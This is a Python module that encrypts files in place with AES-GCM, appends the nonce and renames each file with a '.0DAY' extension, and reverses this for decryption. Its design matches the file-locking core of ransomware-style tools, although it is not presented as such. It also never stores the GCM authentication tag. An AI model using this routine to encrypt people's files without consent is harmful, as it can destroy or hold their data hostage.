import os, sys, stat
from Cryptodome.Cipher import AES     # Pycryptodomex has been used to prevent any
from Cryptodome import Random         # collision with Pycrypto/Pycryptodome packages.
import hashlib                        # Use pip (or conda) install cryptodomex.


BLOCKSIZE = 128
NONCE_SIZE = 12
EXT = '.0DAY'

def _writer(filepath, method, flag, add_iv=None):
  """
  This function takes care of writing to the file - *filepath*
  with the provided method by looping through each line of the 
  file of fixed length, specified by BLOCK_SIZE in global namespace.
  
    Usage
   -------
  filepath = File to be written on.
  
    method = The way in which the file must be overwritten.
             (encrypt or decrypt)
  
      flag = This is to identify if the method being used is
             for encryption or decryption.
  
    add_iv = The *nonce* or *Initialization vector* to be written
             to the file. More preferably *nonce*
  """
  
  os.chmod(filepath, stat.S_IRWXU)
  with open(filepath, 'rb+') as f:
    part = f.read(BLOCKSIZE)
    while part:
      new_line = method(part)
      f.seek(-len(part), 1)
      f.write(new_line)
      
      part = f.read(BLOCKSIZE)
    
    # identify if the file is being encrypted
    if flag and add_iv:
      f.write(add_iv)

def locker(filepath, key):
  """
  This function either encrypts or decrypts the file - *filepath*.
  Encryption or decryption depends upon the file's extension.
  
    Usage
   -------
   filepath = File to be written on.
        
        key = Key to be used for encryption/decryption
  """
  
  try:  
    keyb = hashlib.sha3_256(key.encode()).digest()
    
    # Check if file ends with the required extension.
    # If it does decrypt the file with the given key.
    if filepath.endswith(EXT):
      method = 'decrypt'
      flag = False
      with open(filepath, 'rb+') as f:
        f.seek(-NONCE_SIZE,2)
        iv = f.read()
      os.truncate(filepath, os.path.getsize(filepath) - NONCE_SIZE)
    
    # If the file doesn't end with the required extension,
    # then identify the method as `encrypt` and do the same
    # with the key provided.
    else:
      method = 'encrypt'
      flag = True
      iv = Random.new().read(NONCE_SIZE)
    
    # Make a cipher object with the nonce and key and write
    # to the file with the arguments.
    crp = getattr(AES.new(keyb, AES.MODE_GCM, nonce=iv), method)
    _writer(filepath, crp, flag, iv)
    
    # If the file is being encrypted, add an extension EXT to
    # the end of the file.
    if flag:
      os.rename(filepath, filepath+EXT)
    
    # If the file is being decrypted, get the original extension
    # and remove the extension EXT.
    else:
      origpath = os.path.splitext(filepath)[0]
      os.rename(filepath, origpath)
  
  except FileNotFoundError:
    pass
    
